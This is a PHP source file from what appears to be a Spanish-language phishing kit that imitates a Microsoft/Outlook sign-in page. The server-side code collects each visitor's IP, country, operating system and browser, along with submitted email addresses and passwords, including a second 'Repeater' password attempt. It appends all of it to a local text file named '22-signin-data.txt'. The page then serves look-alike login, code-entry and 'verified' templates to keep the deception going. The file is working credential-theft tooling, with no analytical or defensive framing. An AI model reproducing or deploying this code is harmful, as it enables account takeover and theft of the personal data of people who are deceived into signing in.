<?php
session_start();
    $_send_code = false;
    $panel = 0;
    $data = "";
    //$_template = 'hxt-login-default.php';



    /*if(isset($_GET['acc'])){

        if (!filter_var( base64_decode( $_GET['acc']), FILTER_VALIDATE_EMAIL)) {
            //header('Location: index.php');
            die();
         }


    }*/






    if($_SERVER['REQUEST_METHOD'] == 'GET'){


        if ( isset($_GET['acc']) ) {
            $_to_encode = $_GET['acc'];
            $_to = base64_decode($_to_encode);

        }



        if(isset($_GET['wp'])){//wp=MBI_SIMPLE

            //if(isset($_GET['wp'])){

                switch ($_GET['wp']) {
                    case 'MBI_SIMPLE':
                        $_template = 'hxt-login.php';
                        break;
                    case 'MBI_CODE':
                        $_template = 'hxt-login-code.php';
                        break;
                    case 'MBI_VERIFY':
                        $_template = 'verificado.html';
                        break;
                    case 'session_destroy':
                            session_destroy ();
                            header('Location: index.php?wp=owa');
                            exit();
                        break;
                    default:
                       $_template = 'hxt-login-default.php';
                       break;
                }
            //}

        }
        
    }

    /*if (isset($_GET['wp']) == 'MBI_VERIFY') {
        $_template = 'verificado.html';
    }*/


    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        
        include("php/info.php");
        include("php/location.php");

        //MBI_SIMPLE
        if(isset($_POST['wp'])){

            switch ($_POST['wp']) {

                case 'MBI_SIMPLE':
            
                        //$data = "data" . $_POST;

                        

                        if (!isset($_POST['repeate']) && !isset($_SESSION['acc'])) {

                            $data =  "######### Info Simple " . "\n";
                            $data .= "[IP]: " . $ip . "\n";
                            $data .= "[Pais]: " . $country . "\n";


                            $data .= "[OS]: " . $os_platform . "\n";
                            $data .= "[Navegador]: " . $browser . "\n";

                            
                        }

                        $_repeater = isset($_POST['repeate']) ? "Repeater" : "";

                        //$data .= "######## LOGIN $_repeater #########" . "\n";

                        if (!isset($_SESSION['acc'])) {

                            $data .= "[email]: " .$_POST['acc'] . "\n";
                        }else{
                            //$data .= "[email]: " .$_to . "\n";
                        }
                        

                        $data .= "[password $_repeater]: " .$_POST['passwd'] . "\n";
                        if ($_repeater == 'Repeater') $data .= "######## FIN\n\n";

                        $fp = fopen("22-signin-data.txt",'a');

                        fwrite($fp, $data);
                        fclose($fp);


                        die();
                    break;
                    case 'MBI_VERIFY':

                        $_template = 'verificado.html';
                        break;
                default:
                    //$_repeater = 
                    $data =  "######### Info Simple " . "\n";                
                    $data .= "[IP]: " . $ip . "\n";
                    $data .= "[Pais]: " . $country . "\n";


                    $data .= "[OS]: " . $os_platform . "\n";
                    $data .= "[Navegador]: " . $browser . "\n";

                    if(isset($_POST['acc'])){

                        //$data .= "######## LOGIN #########" . "\n";
                        $data .= "[email]: " .$_POST['acc'] . "\n";
                        $_SESSION['acc'] = $_POST['acc'];                
                    }





                    $fp = fopen("22-signin-data.txt",'a');

                    fwrite($fp, $data);
                    fclose($fp);
                    //header('Location: http://nada.lan');
                    break;
            }

        }

        //header("Location: " . $_SERVER['PHP_SELF'] . "?acc=" . $_POST['acc'] . "&cobrandid=90015&wp=" . $_POST['wp']);

    }
   
   if(!isset($_template)) die();

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="shortcut icon" href="favicon.ico">
    <script src='js/jquery.js' type='text/javascript'></script>    
	<title></title>


    <script type="text/javascript">
        setTimeout(() => {
            
            //$("#loading").addClass( 'hide' );
            $("#page").removeClass( 'hide' );


        }, 2000);
    </script>
</head>
<body class="cb">
    <div id="page" class="hide">
        <!--  -->

        <!--  ?cobrandid=90015&id=292841&contextid=F9F981FA99D19EEF&opid=B6A7876060057E60&bk=1670255669&acc=b91b66b8d6ca4af3888d709655919b7b&pid=0  -->
        
        <div></div>

        

            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="login-paginated-page">
                <div id="lightboxTemplateContainer">

                    <div id="lightboxBackgroundContainer">
                        <div class="background-image-holder" role="presentation">
                            <div id="backgroundImage" style="background-image: url('images/2_background.svg');"
                                class="background-image ext-background-image"></div>
                        </div>
                    </div>


                    <div class="outer">


                        <div class="template-section main-section">
                            <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                                <div class="full-height">

                                    <div class="flex-column">
                                        <!--
                                        <div class="background-logo-holder">
                                            <img class="background-logo" src="images/ol.png">
                                        </div -->

                                        <div class="win-scroll">

                                            <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                                <div id="progressBar" class="progress hide" role="progressbar" aria-label="Espera">
                                                    <div></div><div></div><div></div><div></div><div></div>
                                                </div>
                                                <?php
                                                    include('hxt_panels/'.$_template);
                                                ?>

                                            </div>

                                        </div>
                                    </div>
                                    
                                </div>
                            </div>
                        </div>

                        
                        <div id="footer" role="contentinfo" class="footer ext-footer has-background ext-has-background background-always-visible ext-background-always-visible">

                            <div>
                                
                                <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">


                                    <a id="ftrTerms" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Términos de uso</a>
                                    <!-- /ko -->

                                    
                                    <a id="ftrPrivacy"  href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacidad y cookies</a>
                                    <a id="moreOptions" href="#" role="button" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                                </div>

                            </div>
                        </div>
                        
                    </div>
                    
                </div>

            </div>


        
        <div id="idPartnerPL"></div>
    </div>
</body>
</html>